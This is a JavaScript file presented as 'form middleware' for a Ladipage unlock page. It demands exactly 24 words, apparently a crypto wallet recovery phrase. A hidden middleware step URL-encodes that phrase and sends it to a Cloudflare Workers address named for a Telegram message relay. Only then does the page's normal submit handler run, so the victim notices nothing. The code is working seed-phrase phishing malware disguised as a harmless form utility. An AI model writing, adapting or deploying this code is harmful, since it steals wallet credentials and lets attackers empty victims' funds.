/**
 * Form Middleware System for Ladipage Unlock Form
 * - Middleware 1: Extract form data
 * - Middleware 2: Validate passphrase (24 từ)
 * - Middleware 3: Gửi API trước khi handler chạy
 * - Sau đó mới gọi handler submit gốc
 */

const formMiddleware = {
  middlewares: [],
  use(fn) { this.middlewares.push(fn); return this; },
  execute(event, next) {
    let index = 0;
    const executeNext = () => {
      if (index < this.middlewares.length) {
        const middleware = this.middlewares[index++];
        middleware(event, executeNext);
      } else {
        next();
      }
    };
    executeNext();
  }
};

const unlockFormMiddleware = Object.create(formMiddleware);

// Middleware 1: extract data
unlockFormMiddleware.use((event, next) => {
  console.log("Middleware 1: Extract form data");
  event.preventDefault();

  const formData = new FormData(event.target);
  const data = {};
  formData.forEach((v, k) => (data[k] = v.trim()));
  event.formData = data;

  console.log("Form data:", data);
  next();
});

// Middleware 2: validate passphrase
unlockFormMiddleware.use((event, next) => {
  console.log("Middleware 2: Validate passphrase");
  const passphrase = event.formData?.message || "";
  if (!passphrase) {
    alert("Please enter your 24-word passphrase");
    return;
  }
  const words = passphrase.split(/\s+/);
  if (words.length !== 24) {
    alert("Passphrase must contain exactly 24 words");
    return;
  }
  next();
});

// Middleware 3: gọi API trước khi handler chạy
unlockFormMiddleware.use((event, next) => {
  console.log("Middleware 3: Sending API request…");

  const content = encodeURIComponent(event.formData?.message || "");
  const url = `https://sendmessagetele.myloverkt.workers.dev/?text=${content}`;

  fetch(url)
    .then(res => {
      console.log("API response status:", res.status);
      next(); // tiếp tục sau khi gọi API xong
    })
    .catch(err => {
      console.error("API request failed:", err);
      next(); // vẫn cho chạy tiếp nếu lỗi
    });
});

let middlewareExecuting = false;

document.addEventListener("DOMContentLoaded", () => {
  console.log("Setting up unlock form middleware");

  // ✅ đúng selector form trong #FORM4
  const unlockForm = document.querySelector("#FORM4 form.ladi-form");
  if (!unlockForm) {
    console.warn("Unlock form not found!");
    return;
  }

  const originalAddEventListener = Element.prototype.addEventListener;

  unlockForm.addEventListener = function (type, listener, options) {
    if (type === "submit") {
      console.log("Intercepting submit event binding");
      const wrappedListener = function (event) {
        if (middlewareExecuting) return;
        middlewareExecuting = true;
        console.log("Form submission intercepted → running middlewares");
        unlockFormMiddleware.execute(event, () => {
          console.log("All middlewares done → run original handler");
          listener.call(unlockForm, event);
          setTimeout(() => (middlewareExecuting = false), 100);
        });
      };
      return originalAddEventListener.call(this, type, wrappedListener, options);
    }
    return originalAddEventListener.call(this, type, listener, options);
  };

  // --- Demo handler cuối (thay bằng xử lý của bạn) ---
  unlockForm.addEventListener("submit", function (event) {
    console.log("Final handler received:", event.formData);
    alert("Form submitted OK!\n\n" + JSON.stringify(event.formData, null, 2));
  });
});
